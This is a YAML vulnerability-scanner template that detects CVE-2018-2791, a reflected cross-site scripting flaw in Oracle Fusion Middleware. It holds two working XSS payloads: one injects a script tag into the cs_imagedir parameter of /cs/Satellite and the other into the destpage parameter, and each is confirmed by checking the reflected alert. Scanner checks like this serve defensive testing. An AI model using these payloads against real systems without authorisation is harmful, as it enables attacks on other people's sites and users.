id: CNNVD-201804-1230
name: CVE-2018-2791
tags:
    - Oracle-Fusion-Middleware
transport: http
set:
    BaseURL: request.url.host
    randstr: randomLowercase(6)
rules:
    r0:
        request:
            cache: true
            follow_redirects: true
            method: GET
            path: /cs/Satellite?pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22%3E%3Cscript%3Ealert({{randstr}})%3C/script%3E
            headers:
                Host: '{{BaseURL}}'
        expression: response.body.bcontains(b'<script>alert({{randstr}})</script>/graphics/common/screen/dotclear.gif') ||
                    (response.body.bcontains(b'<script>alert(24)</script>') && response.body.bcontains(b'Missing translation key'))
    r1:
        request:
            cache: true
            follow_redirects: true
            method: GET
            path: /cs/Satellite?destpage="<h1xxx"><script>alert({{randstr}})</script>&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
            headers:
                Host: '{{BaseURL}}'
        expression: response.body.bcontains(b'<script>alert({{randstr}})</script>/graphics/common/screen/dotclear.gif') ||
                    (response.body.bcontains(b'<script>alert(24)</script>') && response.body.bcontains(b'Missing translation key'))
expression: r0() || r1()
detail:
    vulnerability:
        proof:
            info: 存在CVE-2018-2791漏洞
        info: ""
needreverse: false
